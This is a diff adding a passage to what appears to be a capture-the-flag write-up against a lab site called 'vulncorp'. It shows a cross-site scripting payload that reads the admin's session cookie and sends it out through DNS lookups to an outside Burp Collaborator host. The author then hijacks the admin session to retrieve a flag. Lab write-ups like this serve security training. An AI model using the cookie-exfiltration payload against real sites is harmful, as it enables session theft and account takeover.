@@ -586,3 +586,37 @@ Send another request soon after and the message updates to 'You can only send on
 Quick fuzz on the parameter (?FUZZ=1) doesn't bring back anything new.
 
 So I probably have to send a message to the admin which will make them auto approve access to the share without them having to do a click.
+
+OK lets see if I can get it to make a request out to my Burp collaborator
+
+Sent a request with this content
+
+```html
+<img src=http://en5ms4z01r6dp6feh71gefk1zs5it7.oastify.com/xx>
+```
+
+And collab then reports a DNS lookup
+
+![alt](./images/vulncorp-18.png)
+
+But there is no HTTP request, and the IP it's reporting is not part of the scope.
+
+So I can't rely on HTTP requests. BUT, this may work
+
+```
+<script>var i = new Image();i.src="http://" + document.cookie.split(';')[1].split('=')[1] + ".vsrc8isplbyjsz24fprr8iv1vs1ip7.oastify.com";document.getElementsByTagName('body')[0].appendChild(i);</script>
+```
+
+And yes I get the admin token cookie value :D
+
+![alt](./images/vulncorp-19.png)
+
+Quick switch of my token with theirs and I can now access the share!
+
+![alt](./images/vulncorp-20.png)
+
+This contains a file called flag.txt containing flag 8 :)
+
+OK the link to the file is http://prueba.vulncorp.co.uk/share/183/1733
+
+Which seems a little odd so maybe there are other files on a different number
